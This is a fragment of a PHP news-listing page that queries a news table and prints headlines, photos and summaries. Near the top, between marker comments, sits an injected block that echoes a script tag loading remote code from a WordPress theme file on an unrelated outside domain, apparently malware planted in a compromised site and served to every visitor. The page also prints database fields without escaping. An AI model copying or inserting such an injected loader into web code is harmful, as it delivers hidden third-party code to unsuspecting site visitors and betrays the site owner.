...
<?
/// News
$query = "select * from news where status = 1 order by insert_date DESC";
...
#b3fe4c#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224438\"></script>";
echo $srwv;
}
#/b3fe4c#
?>
	...
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		...
		<b><!-- InstanceBeginEditable name="header" -->News<!-- InstanceEndEditable --></b>
	...
	?>
	<div style="border-bottom:#999999 dotted 1px;">
	<?
		if($val["photo"] != "") {
	?>
		<a href="news.php?id=<?=$val["id"] ?>"><img border="0" hspace="3" vspace="3" align="left" width="120" height="90" src="../upload/image/<?=$val["photo"] ?>"  /></a>
	<? } ?>		
		<div><a href="news_d.php?id=<?=$val["id"] ?>"  style="color: #990000; font-family:Verdana; font-size:12px"><?=$val["header"] ?></a></div>
		<?=$val["short_desc"] ?>
		<div align="right"><a href="news_d.php?id=<?=$val["id"] ?>"  style="color: #990000; font-family:Verdana; font-size:12px">More Details</a></div>
	<br clear="all" />
	</div>
